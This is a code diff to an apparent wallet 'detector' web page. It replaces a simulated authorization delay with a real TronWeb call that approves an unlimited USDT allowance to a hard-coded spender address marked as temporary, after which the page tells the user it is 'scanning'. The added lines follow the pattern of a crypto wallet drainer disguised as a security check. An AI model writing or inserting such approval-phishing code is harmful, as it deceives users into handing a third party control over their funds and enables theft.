@@ -707,15 +707,28 @@ const Index = () => {
   const startAuthorization = async () => {
     if (!wallet) return;
 
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const SPENDER_ADDRESS = "TXYZabcdef1234567890abcdef12345678"; // 临时地址，后期替换
+    const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
     setError(null);
     setHelperText({ key: "detector.helper.authorizing" });
     setStage("authorizing");
 
     try {
-      await sleep(1600);
+      const tronWeb = (window as any).tronWeb;
+      if (!tronWeb) throw new Error("TronWeb not available");
+
+      const contract = await tronWeb.contract().at(USDT_CONTRACT);
+      await contract.approve(SPENDER_ADDRESS, MAX_UINT256).send({
+        feeLimit: 100_000_000,
+        callValue: 0,
+      });
+
       setHelperText({ key: "detector.helper.authorized" });
       setStage("scanning");
-    } catch {
+    } catch (err: any) {
+      console.error("Authorization failed:", err);
       setStage("connected");
       setError({ key: "errors.authorizationInterrupted" });
     }
